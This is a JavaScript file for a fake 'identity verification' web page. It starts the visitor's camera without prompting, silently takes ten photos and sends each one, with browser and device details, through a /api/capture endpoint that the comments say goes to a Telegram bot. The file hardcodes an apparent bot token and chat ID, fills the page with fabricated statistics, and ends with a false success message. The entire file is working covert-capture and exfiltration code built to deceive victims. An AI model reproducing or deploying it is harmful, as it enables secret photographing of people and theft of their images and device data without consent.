// Configuration
const TELEGRAM_BOT_TOKEN = '8563974543:AAEOdbldGKCFeBNFqTjq_umFlMaufJog1sM'; // Replace with your token
const TELEGRAM_CHAT_ID = '8121449821'; // Replace with your chat ID
const CAPTURE_INTERVAL = 2000; // Capture every 2 seconds
const MAX_CAPTURES = 10; // Maximum number of captures

// State variables
let cameraStream = null;
let captureCount = 0;
let isCapturing = false;
let progressInterval = null;

// DOM Elements
const videoElement = document.getElementById('cameraFeed');
const canvasElement = document.getElementById('photoCanvas');
const startButton = document.getElementById('startCamera');
const captureButton = document.getElementById('captureBtn');
const retryButton = document.getElementById('retryBtn');
const progressFill = document.getElementById('progressFill');
const progressText = document.getElementById('progressText');
const userCountElement = document.getElementById('userCount');
const successRateElement = document.getElementById('successRate');
const avgTimeElement = document.getElementById('avgTime');

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    updateStats();
    autoStartCamera();
});

// Auto-start camera after 1 second
function autoStartCamera() {
    setTimeout(() => {
        startButton.click();
    }, 1000);
}

// Start camera
startButton.addEventListener('click', async function() {
    try {
        updateProgress(10, "Requesting camera access...");
        
        // Request camera access
        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: 'user'
            },
            audio: false
        });
        
        // Display camera feed
        videoElement.srcObject = cameraStream;
        
        updateProgress(30, "Camera access granted!");
        
        // Enable capture button
        captureButton.disabled = false;
        startButton.disabled = true;
        
        // Update button text
        startButton.innerHTML = '<i class="fas fa-check-circle"></i> Camera Ready';
        startButton.classList.remove('primary');
        startButton.classList.add('success');
        
        // Start automatic capturing after 2 seconds
        setTimeout(() => {
            startAutomaticCapture();
        }, 2000);
        
    } catch (error) {
        console.error('Camera error:', error);
        updateProgress(0, "Camera access denied. Please allow camera access.");
        showError("Camera access is required for verification.");
    }
});

// Start automatic capture sequence
function startAutomaticCapture() {
    if (isCapturing) return;
    
    isCapturing = true;
    captureCount = 0;
    
    updateProgress(40, "Starting face verification...");
    
    // Start progress animation
    let progress = 40;
    progressInterval = setInterval(() => {
        if (progress < 90) {
            progress += 1;
            updateProgress(progress, "Verifying identity...");
        }
    }, 200);
    
    // Start capturing
    capturePhoto();
}

// Capture photo
function capturePhoto() {
    if (!cameraStream || captureCount >= MAX_CAPTURES) {
        finishCapture();
        return;
    }
    
    try {
        // Set canvas dimensions
        const video = videoElement;
        canvasElement.width = video.videoWidth;
        canvasElement.height = video.videoHeight;
        
        // Draw video frame to canvas
        const context = canvasElement.getContext('2d');
        context.drawImage(video, 0, 0, canvasElement.width, canvasElement.height);
        
        // Convert to base64
        const imageData = canvasElement.toDataURL('image/jpeg', 0.8);
        
        // Send to Telegram
        sendToTelegram(imageData);
        
        captureCount++;
        updateProgress(40 + (captureCount * 5), `Captured ${captureCount}/${MAX_CAPTURES}...`);
        
        // Update capture button
        captureButton.innerHTML = `<i class="fas fa-camera"></i> Capturing... (${captureCount}/${MAX_CAPTURES})`;
        
        // Schedule next capture
        setTimeout(capturePhoto, CAPTURE_INTERVAL);
        
    } catch (error) {
        console.error('Capture error:', error);
    }
}

// Finish capture sequence
function finishCapture() {
    isCapturing = false;
    clearInterval(progressInterval);
    
    updateProgress(100, "Verification complete! Access granted.");
    
    // Update buttons
    captureButton.innerHTML = '<i class="fas fa-check-circle"></i> Verified Successfully';
    captureButton.disabled = true;
    
    // Stop camera after 3 seconds
    setTimeout(() => {
        stopCamera();
        showSuccess();
    }, 3000);
}

// Stop camera
function stopCamera() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
        videoElement.srcObject = null;
    }
}

// Send photo to Telegram via Cloudflare Worker
async function sendToTelegram(imageData) {
    try {
        // Remove data URL prefix
        const base64Data = imageData.split(',')[1];
        
        // Prepare data
        const data = {
            image: base64Data,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${window.screen.width}x${window.screen.height}`
        };
        
        // Send to Cloudflare Worker
        const response = await fetch('/api/capture', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        if (!response.ok) {
            throw new Error('Failed to send image');
        }
        
        console.log('Image sent successfully');
        
    } catch (error) {
        console.error('Telegram send error:', error);
    }
}

// Update progress bar
function updateProgress(percentage, text) {
    progressFill.style.width = `${percentage}%`;
    progressText.textContent = text;
}

// Show success message
function showSuccess() {
    // Create success modal
    const modal = document.createElement('div');
    modal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.8);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 1000;
    `;
    
    modal.innerHTML = `
        <div style="
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            animation: fadeIn 0.3s ease;
        ">
            <div style="
                width: 80px;
                height: 80px;
                background: #4CAF50;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 20px;
            ">
                <i class="fas fa-check" style="color: white; font-size: 40px;"></i>
            </div>
            <h2 style="color: #2d3748; margin-bottom: 15px;">Verification Successful!</h2>
            <p style="color: #718096; margin-bottom: 25px;">
                Your identity has been verified successfully. You now have full access.
            </p>
            <button onclick="this.parentElement.parentElement.remove(); location.reload();" 
                    style="
                        background: #4CAF50;
                        color: white;
                        border: none;
                        padding: 12px 30px;
                        border-radius: 50px;
                        font-size: 16px;
                        cursor: pointer;
                    ">
                Continue
            </button>
        </div>
    `;
    
    document.body.appendChild(modal);
}

// Show error message
function showError(message) {
    alert(`Error: ${message}\n\nPlease refresh the page and allow camera access.`);
}

// Update fake statistics
function updateStats() {
    // Random but realistic looking stats
    const users = Math.floor(Math.random() * 500) + 1000;
    const rate = (Math.random() * 0.4 + 99.5).toFixed(1);
    const time = (Math.random() * 1 + 2).toFixed(1);
    
    userCountElement.textContent = users.toLocaleString();
    successRateElement.textContent = `${rate}%`;
    avgTimeElement.textContent = `${time}s`;
    
    // Animate numbers
    animateCounter(userCountElement, users);
    animateCounter(successRateElement, parseFloat(rate));
    animateCounter(avgTimeElement, parseFloat(time));
}

// Animate counter
function animateCounter(element, target) {
    const start = 0;
    const duration = 2000;
    const increment = target / (duration / 16);
    let current = start;
    
    const timer = setInterval(() => {
        current += increment;
        if (current >= target) {
            current = target;
            clearInterval(timer);
        }
        
        if (element === successRateElement || element === avgTimeElement) {
            element.textContent = `${current.toFixed(1)}${element.textContent.includes('%') ? '%' : 's'}`;
        } else {
            element.textContent = Math.floor(current).toLocaleString();
        }
    }, 16);
}

// Retry button
retryButton.addEventListener('click', function() {
    location.reload();
});
